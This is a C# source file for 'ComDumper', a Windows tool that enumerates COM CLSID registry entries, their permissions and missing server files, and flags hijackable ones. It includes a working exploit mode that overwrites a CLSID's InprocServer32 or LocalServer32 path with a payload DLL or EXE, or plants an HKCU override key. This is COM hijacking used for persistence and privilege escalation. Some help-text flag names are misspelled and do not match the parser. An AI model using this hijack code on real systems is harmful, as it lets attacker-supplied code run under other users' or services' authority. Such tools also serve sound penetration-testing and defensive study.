using System;
using System.IO;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Collections.Generic;
using Microsoft.Win32;
using System.DirectoryServices.AccountManagement;
using System.Linq;
using System.Security;


class Program
{
    static void Main(string[] args)
    {
    
        var options = ArgParser.Parse(args);
        if (!ArgParser.ValidateArgs(options,args))
        {
            ArgParser.PrintHelp();
            return;
        }

        if (args.Length == 0 || (args.Length == 1 && (args[0] == "-h" || args[0] == "--help")))
        {
            ArgParser.PrintHelp();
            return;
        }
        // Check if -sA is used
        if (args[0] == "-sA")
        {
            var entries = ComDumper.SearchAllCLSIDS(options.Limit);
            if (options.Verbose)
            {

                
                if (options.FilterMissing)
                {
                    entries = Filter.FilterMissingFiles(entries);
                }
                if (options.FilterUser != null)
                {
                    entries = Filter.FilterByUser(entries, options.FilterUser);
                }
                if (options.FilterGroup != null)
                {
                    entries = Filter.FilterByGroup(entries, options.FilterGroup);
                }
                if (options.FilterOwner != null)
                {
                    entries = Filter.FilterByOwner(entries, options.FilterOwner);
                }
                if (options.FilterAccess != null)
                {
                    entries = Filter.FilterByAccess(entries, options.FilterAccess);
                }
                if (options.FilterVulnerable)
                {
                    entries = Filter.FilterVulnerable(entries);
                }
                if (options.FilterHijackable)
                {
                    entries = Filter.FilterHijackable(entries);
                }
                if (options.FilterUnresolvedSid)
                {
                    entries = Filter.FilterByUnresolvedSid(entries);
                }
                foreach (var entry in entries)
                {
                    ComDumper.VerboseView(entry.clsid, entry.progId, entry.caption, entry.inproc, entry.localServer, entry.access, entry.owner, entry.source, entry.userAccess);
                    Console.WriteLine();
                }
                if (options.OutputFile != null)
                {
                    ComDumper.WriteCsvOutput(options.OutputFile, entries);
                    Console.WriteLine($"[+] Output written to {options.OutputFile}");
                }

            }
            else
            {
                if (options.OutputFile != null)
                {
                    ComDumper.WriteCsvOutput(options.OutputFile, entries);
                    Console.WriteLine($"[+] Output written to {options.OutputFile}");

                }
                else
                {
                    Console.WriteLine("[!] No output file specified. Use -o <file> to specify an output file.");
                    return;
                }

            }
            return;
        }
        // Check if -s or -e is used
        if (args[0] == "-s")
        {
            // Must have at least: -s --clsid <CLSID>
            if (args.Length >= 3 && args[1] == "--clsid")
            {
                string clsid = args[2];
                // options.FilterMissing is set if -m or --missing is present
                ComDumper.SearchByCLSID(clsid, options.FilterMissing);
                return;
            }
            else
            {
                Console.WriteLine("[!] Usage: -s --clsid <CLSID> [-m]");
                return;
            }
        }
        if (args[0] == "-e")
        {
            string clsid = null;
            string payloadPath = null;
            bool isExe = false;
            bool hkcu = false;

            for (int i = 1; i < args.Length; i++)
            {
                if (args[i] == "--clsid" && i + 1 < args.Length)
                {
                    clsid = args[++i];
                }
                else if (args[i] == "--dll" && i + 1 < args.Length)
                {
                    payloadPath = args[++i];
                    isExe = false;
                }
                else if (args[i] == "--exe" && i + 1 < args.Length)
                {
                    payloadPath = args[++i];
                    isExe = true;
                }
                else if (args[i] == "--hkcu")
                {
                    hkcu = true;
                }
            }

            if (string.IsNullOrEmpty(clsid) || string.IsNullOrEmpty(payloadPath))
            {
                Console.WriteLine("[!] Usage: -e --clsid <CLSID> (--dll <path> | --exe <path>) [--hkcu]");
                return;
            }

            EXploit.ExploitCOMServer(clsid, payloadPath, isExe, hkcu);
            return;
        }
    }
}

class ArgOptions
{
    public int Limit { get; set; } = 0;
    public bool Verbose { get; set; } = false;
    public string FilterUser { get; set; } = null;
    public string FilterGroup { get; set; } = null;
    public string FilterOwner { get; set; } = null;
    public string FilterAccess { get; set; } = null;
    public bool FilterVulnerable { get; set; } = false;
    public bool FilterHijackable { get; set; } = false;
    public bool FilterMissing { get; set; } = false;
    public bool FilterUnresolvedSid { get; set; } = false;
    public string OutputFile { get; set; } = null;
}

class ArgParser
{
    public static ArgOptions Parse(string[] args)
    {
        var options = new ArgOptions();
        bool saw_sA = false;
        bool hasVerbose = false;
        bool hasOutputFile = false;

        for (int i = 0; i < args.Length; i++)
        {
            switch (args[i])
            {
                case "-sA":
                    saw_sA = true;
                    break;

                case "-n":
                    if (i + 1 < args.Length && int.TryParse(args[i + 1], out int limit))
                    {
                        options.Limit = limit;
                        i++;
                    }
                    else
                    {
                        Console.WriteLine("[!] Invalid or missing value for -n");
                        Environment.Exit(1);
                    }
                    break;

                case "--verbose":
                    options.Verbose = true;
                    hasVerbose = true;
                    break;

                case "-fa":
                    if (i + 1 < args.Length)
                    {
                        options.FilterAccess = args[++i];
                    }
                    else
                    {
                        Console.WriteLine("[!] Missing value for -fa <access>");
                        Environment.Exit(1);
                    }
                    break;
                case "-fu":
                    if (i + 1 < args.Length)
                    {
                        options.FilterUser = args[++i];
                    }
                    else
                    {
                        Console.WriteLine("[!] Missing value for -fa <user>");
                        Environment.Exit(1);
                    }
                    break;

                case "-fg":
                    if (i + 1 < args.Length)
                    {
                        options.FilterGroup = args[++i];
                    }
                    else
                    {
                        Console.WriteLine("[!] Missing value for -fg <group>");
                        Environment.Exit(1);
                    }
                    break;

                case "-fo":
                    if (i + 1 < args.Length)
                    {
                        options.FilterOwner = args[++i];
                    }
                    else
                    {
                        Console.WriteLine("[!] Missing value for -fo <owner>");
                        Environment.Exit(1);
                    }
                    break;

                case "--filter-access":
                    if (i + 1 < args.Length)
                    {
                        options.FilterAccess = args[++i];
                    }
                    else
                    {
                        Console.WriteLine("[!] Missing value for --filter-access <string>");
                        Environment.Exit(1);
                    }
                    break;

                case "--vulnerable":
                    options.FilterVulnerable = true;
                    break;

                case "--hijackable":
                    options.FilterHijackable = true;
                    break;

                case "--missing":
                case "-m":
                    options.FilterMissing = true;
                    break;

                case "--unresolvedsid":
                    options.FilterUnresolvedSid = true;
                    break;

                case "-o":
                    if (i + 1 < args.Length)
                    {
                        options.OutputFile = args[++i];
                        hasOutputFile = true;
                    }
                    else
                    {
                        Console.WriteLine("[!] Missing value for -o <file>");
                        Environment.Exit(1);
                    }
                    break;

                case "-h":
                case "--help":
                    PrintHelp();
                    Environment.Exit(0);
                    break;

                default:
                    // i don't know this option, maybe it's a CLSID or path
                    break;
            }
        }

        // Enforce: if -sA is used, --verbose or -o must be set
        if (saw_sA && !(hasVerbose || hasOutputFile))
        {
            Console.WriteLine("[-] Error: -sA requires either --verbose or -o <file>");
            Environment.Exit(1);
        }

        return options;
    }
    public static bool ValidateArgs(ArgOptions options, string[] args)
    {
        bool saw_sA = args.Contains("-sA");
        bool saw_s = args.Contains("-s");
        bool saw_e = args.Contains("-e");
        bool has_clsid = args.Contains("--clsid");
        bool has_dll = args.Contains("--dll");
        bool has_exe = args.Contains("--exe");
        bool has_hkcu = args.Contains("--hkcu");

        // Rule 1: Only one of -sA, -s, or -e must be used
        int modeCount = (saw_sA ? 1 : 0) + (saw_s ? 1 : 0) + (saw_e ? 1 : 0);
        if (modeCount != 1)
        {
            Console.WriteLine("[-] Error: Use only one mode: -sA, -s, or -e.");
            return false;
        }

        // Rule 2: --verbose is only valid with -sA
        if (options.Verbose && !saw_sA)
        {
            Console.WriteLine("[-] Error: --verbose can only be used with -sA.");
            return false;
        }

        // Rule 3: -o is only valid with -sA
        if (options.OutputFile != null && !saw_sA)
        {
            Console.WriteLine("[-] Error: -o can only be used with -sA.");
            return false;
        }

        // Rule 4: Filters are valid with -sA or -s
        bool hasFilters =
            options.FilterUser != null ||
            options.FilterGroup != null ||
            options.FilterOwner != null ||
            options.FilterAccess != null ||
            options.FilterVulnerable ||
            options.FilterHijackable ||
            options.FilterMissing ||
            options.FilterUnresolvedSid;

        if (hasFilters && !(saw_sA || saw_s))
        {
            Console.WriteLine("[-] Error: Filters can only be used with -sA or -s.");
            return false;
        }

        // Rule 5: --hkcu only valid with -e
        if (has_hkcu && !saw_e)
        {
            Console.WriteLine("[-] Error: --hkcu can only be used with -e.");
            return false;
        }

        // Rule 6: -e requires --clsid and either --dll or --exe (not both)
        if (saw_e)
        {
            if (!has_clsid)
            {
                Console.WriteLine("[-] Error: --clsid is required in exploit mode (-e).");
                return false;
            }
            if (!(has_dll ^ has_exe)) // XOR: must be one only
            {
                Console.WriteLine("[-] Error: Provide exactly one of --dll or --exe in exploit mode.");
                return false;
            }
        }

        // Rule 7: -s requires --clsid
        if (saw_s && !has_clsid)
        {
            Console.WriteLine("[-] Error: --clsid is required with -s.");
            return false;
        }

        return true;
    }




    public static void PrintHelp()
    {
        Console.WriteLine(@"
ComDumper - A simple COM Registry Dumper and Exploiter by @IppY0kai
Usage:
  -sA                         Search and dump all CLSIDs as a CSV file
  -n <number>                 Limit number of CLSIDs dumped
  --verbose                   Verbose output (used with -sA to print output to the standard output)
  -fg <group>                 Filter entries by group
  -fu <user>                  Filter entries writable by specific user (e.g. BUILTIN\Users)
  -fa <access>                Filter entries by access control
  -fo <owner>                 Filter entries by registry key owner
  --filter-access <string>    Filter entries by partial access control string
  -s --clsid <CLSID>          Search and dump info about one CLSID 
  -e --clsid <CLSID> --dll <path>   Exploit mode: replace COM DLL path in registry for CLSID
  -e --clsid <CLSID> --exe <path>   Exploit mode: replace COM EXE path in registry for CLSID
  --hkcu                      Hijack entry under HKCU instead of modifying HKLM
  -o <file>                   Output file for table mode
  --missing, -m               Check if the COM server file (DLL or EXE) is missing from disk (works with -s, -sA)
  --vunerable                 Filter vulnerable entries (missing file or hijackable)
  --hijackabale               Filter hijackable entries only
  --unresolvedsid             Filter entries with unresolved SIDs (e.g. S-1-5-*)
  -h, --help                  Show this help
");
    }
}


class EXploit
{
    public static void ExploitCOMServer(string clsid, string payloadPath, bool isExe, bool HKCU)
    {
        Console.WriteLine($"[+] Exploit mode: CLSID={clsid}, Payload='{payloadPath}', IsExe={isExe}");

        string serverKeyName = isExe ? "LocalServer32" : "InprocServer32";
        string inproc = null, localServer = null;
        string source = null;
        RegistryKey key = null;

        try
        {
            key = Registry.CurrentUser.OpenSubKey($@"SOFTWARE\Classes\CLSID\{clsid}");
            if (key != null)
            {
                source = "HKCU";
            }
            else
            {
                key = Registry.LocalMachine.OpenSubKey($@"SOFTWARE\Classes\CLSID\{clsid}");
                if (key != null)
                {
                    source = "HKLM";
                }
            }
        }
        catch (UnauthorizedAccessException)
        {
            Console.WriteLine("[-] Access denied");
            return;
        }
        catch (SecurityException)
        {
            Console.WriteLine("[-] Access denied");
            return;
        }
        catch (Exception ex)
        {
            Console.WriteLine($"[-] Access denied: {ex.Message}");
            return;
        }

        if (key == null)
        {
            Console.WriteLine("[-] CLSID not found in HKLM or HKCU.");
            Console.WriteLine("[-] Exploit aborted.");
            return;
        }

        try
        {
            inproc = key.OpenSubKey("InprocServer32")?.GetValue("") as string ?? "None";
            localServer = key.OpenSubKey("LocalServer32")?.GetValue("") as string ?? "None";
        }
        catch (Exception ex)
        {
            Console.WriteLine($"[-] Failed to read Inproc/LocalServer: {ex.Message}");
            return;
        }

        string hijackOpportunity = "None";
        if ((source == "HKLM" && !string.IsNullOrEmpty(inproc) && !File.Exists(inproc))
            || (source == "HKLM" && !string.IsNullOrEmpty(localServer) && !File.Exists(localServer)))
        {
            hijackOpportunity = "Possible Hijack Opportunity!!";
        }

        if (HKCU)
        {
            if (hijackOpportunity == "None")
            {
                Console.WriteLine($"[-] No hijack opportunity found for {clsid} in HKLM.");
                Console.WriteLine("[-] Exploit aborted. Try without --hkcu option");
                return;
            }
            else
            {
                Console.WriteLine($"[+] Hijack opportunity found for {clsid} in {source}.");
                Console.WriteLine("[+] Adding registry Key to HKCU");
                string threadingModel = GetThreadingModelFromHKLM(clsid);
                Console.WriteLine("[*] ThreadingModel: " + (threadingModel ?? "Both"));
                RegisterHKCUHijack(clsid, payloadPath, isExe, threadingModel);
                return;
            }
        }

        try
        {
            using (var serverKey = key.OpenSubKey(serverKeyName, writable: true))
            {
                if (serverKey == null)
                {
                    Console.WriteLine($"[-] {serverKeyName} subkey not found.");
                    return;
                }

                string originalPath = serverKey.GetValue("") as string;
                Console.WriteLine($"[+] Original path: {originalPath}");

                string backupPath = Directory.GetCurrentDirectory();
                if (!string.IsNullOrEmpty(backupPath) && !string.IsNullOrEmpty(originalPath))
                {
                    string backupFileName = clsid.Trim('{', '}') + (Path.GetExtension(originalPath) ?? ".bak");
                    string backupFile = Path.Combine(backupPath, backupFileName);

                    try
                    {
                        if (!File.Exists(backupFile))
                        {
                            File.Copy(originalPath.Trim('"'), backupFile);
                            Console.WriteLine($"[+] Backup created at {backupFile}");
                        }
                        else
                        {
                            Console.WriteLine($"[!] Backup file already exists: {backupFile}");
                        }
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"[-] Failed to backup original file: {ex.Message}");
                    }
                }

                Console.WriteLine("[*] Make sure you have access to set the key value!!");
                try
                {
                    serverKey.SetValue("", payloadPath, RegistryValueKind.String);
                    Console.WriteLine($"[+] Successfully replaced {serverKeyName} path with: {payloadPath}");
                }
                catch (UnauthorizedAccessException)
                {
                    Console.WriteLine("[-] Access denied: You do not have permission to modify this registry key.");
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[-] Failed to set new path: {ex.Message}");
                }
            }
        }
        catch (UnauthorizedAccessException)
        {
            Console.WriteLine("[-] Access denied while opening subkey with write access.");
        }
        catch (SecurityException)
        {
            Console.WriteLine("[-] Security exception: Insufficient rights to open subkey with write access.");
        }
        catch (Exception ex)
        {
            Console.WriteLine($"[-] Unexpected error during modification: {ex.Message}");
        }
    }

    public static string GetThreadingModelFromHKLM(string clsid)
        {
           string regPath = $@"SOFTWARE\Classes\CLSID\{clsid}\InprocServer32";
            try
            {
                using (var key = Registry.LocalMachine.OpenSubKey(regPath))
                {
                    if (key == null)
                        return null;

                    object value = key.GetValue("ThreadingModel");
                    return value as string;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] Error reading ThreadingModel: {ex.Message}");
                return null;
        }
     }
     public static void RegisterHKCUHijack(string clsid, string payloadPath, bool isExe, string ThreadingModel = "Both")
        {
            string serverKeyName = isExe ? "LocalServer32" : "InprocServer32";
            string regPath = $@"Software\Classes\CLSID\{clsid}\{serverKeyName}";
            try
            {
                using (var key = Registry.CurrentUser.CreateSubKey(regPath, true))
                {
                    if (key == null)
                    {
                        Console.WriteLine($"[-] Failed to create or open registry key: HKCU\\{regPath}");
                        return;
                    }
                    key.SetValue("", payloadPath, RegistryValueKind.String);
                    if (!isExe)
                        key.SetValue("ThreadingModel", ThreadingModel, RegistryValueKind.String);
                }
                Console.WriteLine($"[+] COM hijack registered under HKCU for CLSID {clsid}");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] Error writing to registry: {ex.Message}");
            }
     }
}

   
class ComDumper
{
    public static List<(string clsid, string source, string progId, string caption, string inproc, string localServer, string access, string owner, string userAccess, string hijackOpportunity, bool MissingFile)>
    SearchAllCLSIDS(int limit)
    {
        var entries = new List<(string clsid, string source, string progId, string caption, string inproc, string localServer, string access, string owner, string userAccess, string hijackOpportunity, bool MissingFile)>();
        foreach (string clsid in GetFirstNClsids(limit))
        {
            try
            {
                string source = null;
                RegistryKey key = Registry.CurrentUser.OpenSubKey($@"SOFTWARE\Classes\CLSID\{clsid}");
                if (key != null)
                {
                    source = "HKCU";
                }
                else
                {
                    key = Registry.LocalMachine.OpenSubKey($@"SOFTWARE\Classes\CLSID\{clsid}");
                    if (key != null)
                        source = "HKLM";
                }
                if (key == null) continue;

                string progId = FindProgIDByCLSID(clsid) ?? "Not Found";
                string caption = key.GetValue("") as string ?? "Not Found";
                string inproc = key.OpenSubKey("InprocServer32")?.GetValue("") as string ?? "None";
                string localServer = key.OpenSubKey("LocalServer32")?.GetValue("") as string ?? "None";
                string access = GetAccessRights(key);
                string owner = GetRegistryKeyOwner(key);
                string userAccess = GetCurrentUserAccess(key);
                bool MissingFile = false;
                if ((inproc != "None" && !File.Exists(inproc)) || (localServer != "None" && !File.Exists(localServer)))
                {
                    MissingFile = true;
                }

                string hijackOpportunity = "None";
                if ((source == "HKLM" && !string.IsNullOrEmpty(inproc) && !File.Exists(inproc))
                    || (source == "HKLM" && !string.IsNullOrEmpty(localServer) && !File.Exists(localServer)))
                {
                    hijackOpportunity = "Possible Hijack Opportunity!!";
                }

                entries.Add((clsid, source, progId, caption, inproc, localServer, access, owner, userAccess, hijackOpportunity, MissingFile));
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] Error processing CLSID {clsid}: {ex.Message}");
            }
        }
        return entries;
    }

    public static void SearchByCLSID(string clsid, bool CheckIsMissing)
    {
        Console.WriteLine($"[*] Searching for CLSID: {clsid}\n");
        string source = null;
        RegistryKey key = Registry.CurrentUser.OpenSubKey($@"SOFTWARE\Classes\CLSID\{clsid}");
        if (key != null)
        {
            source = "HKCU";
        }
        else
        {
            key = Registry.LocalMachine.OpenSubKey($@"SOFTWARE\Classes\CLSID\{clsid}");
            if (key != null)
                source = "HKLM";
        }

        if (key == null)
        {
            Console.WriteLine("[-] CLSID not found.");
            return;
        }
        string progId = FindProgIDByCLSID(clsid);
        string caption = key.GetValue("") as string ?? "";
        string inproc = key.OpenSubKey("InprocServer32")?.GetValue("") as string ?? "None";
        string localServer = key.OpenSubKey("LocalServer32")?.GetValue("") as string ?? "None";
        string access = GetAccessRights(key);
        string owner = GetRegistryKeyOwner(key);
        if (string.IsNullOrEmpty(progId))
        {
            progId = "Not Found";
        }
        if (string.IsNullOrEmpty(caption))
        {
            caption = "Not Found";
        }
        if (string.IsNullOrEmpty(inproc))
        {
            inproc = "None";
        }
        if (string.IsNullOrEmpty(localServer))
        {
            localServer = "None";
        }

        string userAccess = GetCurrentUserAccess(key);
        VerboseView(clsid, progId, caption, inproc, localServer, access, owner, source, userAccess);

        if (CheckIsMissing)
        {
            bool misssig = false;
            Console.WriteLine("\n[!] Checking for missing files...");
            if (!File.Exists(inproc) && inproc != "None")
            {
                Console.WriteLine("[!] Missing InprocServer32 file");
                misssig = true;
            }
            if (!File.Exists(localServer) && localServer != "None")
            {
                Console.WriteLine("[!] Missing LocalServer32 file");
                misssig = true;
            }
            if(!misssig) Console.WriteLine("[+] No missing files found.\n");
        }
    }

    static string FindProgIDByCLSID(string clsid)
    {
        try
        {
            using RegistryKey clsidKey = Registry.ClassesRoot.OpenSubKey($"CLSID\\{clsid}");
            if (clsidKey == null) return "";

            string progId = clsidKey.GetValue("ProgID") as string;
            if (!string.IsNullOrEmpty(progId)) return progId;

            foreach (string subKeyName in clsidKey.GetSubKeyNames())
            {
                using RegistryKey subKey = clsidKey.OpenSubKey(subKeyName);
                if (subKey == null) continue;
                progId = subKey.GetValue("ProgID") as string;
                if (!string.IsNullOrEmpty(progId)) return progId;
            }
        }
        catch { }

        return "";
    }

    static string GetAccessRights(RegistryKey key)
    {
        try
        {
            RegistrySecurity security = key.GetAccessControl();
            AuthorizationRuleCollection rules = security.GetAccessRules(true, true, typeof(SecurityIdentifier));
            string accessList = "";
            foreach (RegistryAccessRule rule in rules)
            {
                string sid = rule.IdentityReference.Value;
                string resolvedName = ResolveSidToName(sid);
                string rights = rule.RegistryRights.ToString();
                accessList += $"{resolvedName} ({rights}) ";
            }
            return accessList.Trim();
        }
        catch (Exception ex)
        {
            return $"Error: {ex.Message}";
        }
    }

    static string ResolveSidToName(string sidString)
    {
        try
        {
            SecurityIdentifier sid = new SecurityIdentifier(sidString);
            NTAccount account = sid.Translate(typeof(NTAccount)) as NTAccount;
            return account?.Value ?? sidString;
        }
        catch
        {
            return sidString;
        }
    }

    static string GetRegistryKeyOwner(RegistryKey key)
    {
        try
        {
            RegistrySecurity security = key.GetAccessControl();
            IdentityReference owner = security.GetOwner(typeof(NTAccount));
            return owner.Value;
        }
        catch (Exception ex)
        {
            return $"Error: {ex.Message}";
        }
    }

    static string GetCurrentUserAccess(RegistryKey key)
    {
        try
        {
            var identity = System.Security.Principal.WindowsIdentity.GetCurrent();
            var principal = new System.Security.Principal.WindowsPrincipal(identity);
            var security = key.GetAccessControl();
            var rules = security.GetAccessRules(true, true, typeof(System.Security.Principal.SecurityIdentifier));

            bool canWrite = false;
            bool canRead = false;

            foreach (RegistryAccessRule rule in rules)
            {
                if (identity.User != null && identity.User.Equals(rule.IdentityReference) ||
                    principal.IsInRole((System.Security.Principal.SecurityIdentifier)rule.IdentityReference))
                {
                    if ((rule.RegistryRights & RegistryRights.WriteKey) != 0 ||
                        (rule.RegistryRights & RegistryRights.FullControl) != 0)
                    {
                        if (rule.AccessControlType == AccessControlType.Allow)
                            canWrite = true;
                    }
                    if ((rule.RegistryRights & RegistryRights.ReadKey) != 0 ||
                        (rule.RegistryRights & RegistryRights.FullControl) != 0)
                    {
                        if (rule.AccessControlType == AccessControlType.Allow)
                            canRead = true;
                    }
                }
            }

            if (canWrite)
                return "Write";
            if (canRead)
                return "Read";
            return "No Access";
        }
        catch
        {
            return "Unknown";
        }
    }

    static List<string> GetFirstNClsids(int limit)
    {
        var clsids = new List<string>();
        using (var classesRoot = Microsoft.Win32.Registry.ClassesRoot.OpenSubKey("CLSID"))
        {
            if (classesRoot == null)
                return clsids;

            int count = 0;
            foreach (string clsid in classesRoot.GetSubKeyNames())
            {
                if (limit > 0 && count >= limit)
                    break;
                clsids.Add(clsid);
                count++;
            }
        }
        return clsids;
    }

    public static void VerboseView(string clsid, string progId, string caption, string inproc, string localServer, string access, string owner, string source, string userAccess = "Read")
    {
        string HijackOpportunity = "None";
        if ((source == "HKLM" && !string.IsNullOrEmpty(inproc) && !File.Exists(inproc))
            || (source == "HKLM" && !string.IsNullOrEmpty(localServer) && !File.Exists(localServer)))
        {
            HijackOpportunity = "Possible Hijack Opportunity!!";
        }
        if (caption.StartsWith("{") && caption.EndsWith("}"))
        {
            Console.WriteLine($"[CLSID]         {caption}");
            Console.WriteLine($"Source          : {source}");
            Console.WriteLine($"ProgID          : {progId}");
            Console.WriteLine($"Caption         : CLSID In Caption");
            Console.WriteLine($"InprocServer32  : {inproc}");
            Console.WriteLine($"LocalServer32   : {localServer}");
            Console.WriteLine($"AccessControl   : {access}");
            Console.WriteLine($"Owner           : {owner}");
            Console.WriteLine($"UserAccess      : {userAccess}");
            Console.WriteLine($"HijackOpportunity: {HijackOpportunity}");
        } else
        {
            Console.WriteLine($"[CLSID]         {clsid}");
            Console.WriteLine($"Source          : {source}");
            Console.WriteLine($"ProgID          : {progId}");
            Console.WriteLine($"Caption         : {caption}");
            Console.WriteLine($"InprocServer32  : {inproc}");
            Console.WriteLine($"LocalServer32   : {localServer}");
            Console.WriteLine($"AccessControl   : {access}");
            Console.WriteLine($"Owner           : {owner}");
            Console.WriteLine($"UserAccess      : {userAccess}");
            Console.WriteLine($"HijackOpportunity: {HijackOpportunity}");
        }

    }

    public static void WriteCsvOutput(
        string csvFile,
        List<(string clsid, string source, string progId, string caption, string inproc, string localServer, string access, string owner, string userAccess, string hijackOpportunity, bool MissingFile)> entries)
    {
        using (var writer = new StreamWriter(csvFile, false, System.Text.Encoding.UTF8))
        {
            writer.WriteLine("CLSID,Source,ProgID,Caption,InprocServer32,LocalServer32,AccessControl,Owner,UserAccess,HijackOpportunity,MissingFile");
            foreach (var entry in entries)
            {
                string CsvEscape(string s) => "\"" + (s?.Replace("\"", "\"\"") ?? "") + "\"";
                if (entry.caption.StartsWith("{") && entry.caption.EndsWith("}"))
                {
                    writer.WriteLine(
                        $"{CsvEscape(entry.caption)},{CsvEscape(entry.source)},{CsvEscape(entry.progId)},{CsvEscape("CLSID In Caption")},{CsvEscape(entry.inproc)},{CsvEscape(entry.localServer)},{CsvEscape(entry.access)},{CsvEscape(entry.owner)},{CsvEscape(entry.userAccess)},{CsvEscape(entry.hijackOpportunity)},{entry.MissingFile.ToString()}"
                    );
                }
                else
                {
                    writer.WriteLine(
                        $"{CsvEscape(entry.clsid)},{CsvEscape(entry.source)},{CsvEscape(entry.progId)},{CsvEscape(entry.caption)},{CsvEscape(entry.inproc)},{CsvEscape(entry.localServer)},{CsvEscape(entry.access)},{CsvEscape(entry.owner)},{CsvEscape(entry.userAccess)},{CsvEscape(entry.hijackOpportunity)},{entry.MissingFile.ToString()}"
                    );


                }
            }    }
    }
}

public class Filter
{
    public static List<(string clsid, string source, string progId, string caption, string inproc, string localServer,
        string access, string owner, string userAccess, string hijackOpportunity, bool MissingFile)>
    FilterMissingFiles(List<(string clsid, string source, string progId, string caption, string inproc, string localServer,
        string access, string owner, string userAccess, string hijackOpportunity, bool MissingFile)> entries)
    {
        var result = new List<(string clsid, string source, string progId, string caption, string inproc, string localServer,
            string access, string owner, string userAccess, string hijackOpportunity, bool MissingFile)>();

        foreach (var entry in entries)
        {
            if (entry.MissingFile)
            {
                result.Add(entry);
            }
        }
        return result;
    }

    public static List<(string clsid, string source, string progId, string caption, string inproc, string localServer,
    string access, string owner, string userAccess, string hijackOpportunity, bool MissingFile)>
    FilterByUser(
        List<(string clsid, string source, string progId, string caption, string inproc, string localServer,
        string access, string owner, string userAccess, string hijackOpportunity, bool MissingFile)> entries,
        string username)
        {
            var result = new List<(string clsid, string source, string progId, string caption, string inproc, string localServer,
                string access, string owner, string userAccess, string hijackOpportunity, bool MissingFile)>();

            var groups = GetUserGroups(username);
            groups.Add(username);  // also check for username directly

            foreach (var entry in entries)
            {
                if (groups.Any(g => !string.IsNullOrEmpty(entry.access) &&
                    entry.access.IndexOf(g, StringComparison.OrdinalIgnoreCase) >= 0))
                {
                    result.Add(entry);
                }
            }
            return result;
        }

    public static List<(string clsid, string source, string progId, string caption, string inproc, string localServer,
        string access, string owner, string userAccess, string hijackOpportunity, bool MissingFile)>
    FilterByGroup(List<(string clsid, string source, string progId, string caption, string inproc, string localServer,
        string access, string owner, string userAccess, string hijackOpportunity, bool MissingFile)> entries, string group)
    {
        var result = new List<(string clsid, string source, string progId, string caption, string inproc, string localServer,
            string access, string owner, string userAccess, string hijackOpportunity, bool MissingFile)>();

        foreach (var entry in entries)
        {
            if (!string.IsNullOrEmpty(entry.access) && entry.access.IndexOf(group, StringComparison.OrdinalIgnoreCase) >= 0)
            {
                result.Add(entry);
            }
        }
        return result;
    }

    public static List<(string clsid, string source, string progId, string caption, string inproc, string localServer,
        string access, string owner, string userAccess, string hijackOpportunity, bool MissingFile)>
    FilterHijackable(List<(string clsid, string source, string progId, string caption, string inproc, string localServer,
        string access, string owner, string userAccess, string hijackOpportunity, bool MissingFile)> entries)
    {
        var result = new List<(string clsid, string source, string progId, string caption, string inproc, string localServer,
            string access, string owner, string userAccess, string hijackOpportunity, bool MissingFile)>();

        foreach (var entry in entries)
        {
            if (entry.hijackOpportunity == "Possible Hijack Opportunity!!")
            {
                result.Add(entry);
            }
        }
        return result;
    }

    public static List<(string clsid, string source, string progId, string caption, string inproc, string localServer,
        string access, string owner, string userAccess, string hijackOpportunity, bool MissingFile)>
    FilterByOwner(List<(string clsid, string source, string progId, string caption, string inproc, string localServer,
        string access, string owner, string userAccess, string hijackOpportunity, bool MissingFile)> entries, string owner)
    {
        var result = new List<(string clsid, string source, string progId, string caption, string inproc, string localServer,
            string access, string owner, string userAccess, string hijackOpportunity, bool MissingFile)>();

        foreach (var entry in entries)
        {
            if (!string.IsNullOrEmpty(entry.owner) && entry.owner.IndexOf(owner, StringComparison.OrdinalIgnoreCase) >= 0)
            {
                result.Add(entry);
            }
        }
        return result;
    }

    public static List<(string clsid, string source, string progId, string caption, string inproc, string localServer,
        string access, string owner, string userAccess, string hijackOpportunity, bool MissingFile)>
    FilterByAccess(List<(string clsid, string source, string progId, string caption, string inproc, string localServer,
        string access, string owner, string userAccess, string hijackOpportunity, bool MissingFile)> entries, string access)
    {
        var result = new List<(string clsid, string source, string progId, string caption, string inproc, string localServer,
            string access, string owner, string userAccess, string hijackOpportunity, bool MissingFile)>();

        foreach (var entry in entries)
        {
            if (!string.IsNullOrEmpty(entry.userAccess) && entry.access.IndexOf(access, StringComparison.OrdinalIgnoreCase) >= 0)
            {
                result.Add(entry);
            }
        }
        return result;
    }

    public static List<(string clsid, string source, string progId, string caption, string inproc, string localServer,
        string access, string owner, string userAccess, string hijackOpportunity, bool MissingFile)>
    FilterVulnerable(List<(string clsid, string source, string progId, string caption, string inproc, string localServer,
        string access, string owner, string userAccess, string hijackOpportunity, bool MissingFile)> entries)
    {
        var result = new List<(string clsid, string source, string progId, string caption, string inproc, string localServer,
            string access, string owner, string userAccess, string hijackOpportunity, bool MissingFile)>();

        foreach (var entry in entries)
        {
            if (entry.MissingFile || entry.hijackOpportunity == "Possible Hijack Opportunity!!")
            {
                result.Add(entry);
            }
        }
        return result;
    }

    public static List<(string clsid, string source, string progId, string caption, string inproc, string localServer,
        string access, string owner, string userAccess, string hijackOpportunity, bool MissingFile)>
    FilterByUnresolvedSid(List<(string clsid, string source, string progId, string caption, string inproc, string localServer,
        string access, string owner, string userAccess, string hijackOpportunity, bool MissingFile)> entries)
    {
        var result = new List<(string clsid, string source, string progId, string caption, string inproc, string localServer,
            string access, string owner, string userAccess, string hijackOpportunity, bool MissingFile)>();

        foreach (var entry in entries)
        {
            // Look for "S-1-5-" or similar SID patterns in the access control string
            if (!string.IsNullOrEmpty(entry.access) && entry.access.IndexOf("S-1-5-", StringComparison.OrdinalIgnoreCase) >= 0)
            {
                result.Add(entry);
            }
        }
        return result;
    }
    

    public static List<string> GetUserGroups(string username)
    {
        var groups = new List<string>();

        using (var context = new PrincipalContext(ContextType.Machine))
        {
            var user = UserPrincipal.FindByIdentity(context, username);
            if (user != null)
            {
                foreach (var group in user.GetAuthorizationGroups())
                {
                    groups.Add(group.SamAccountName); // group name like "Administrateurs"
                }
            }
        }

        return groups;
    }

}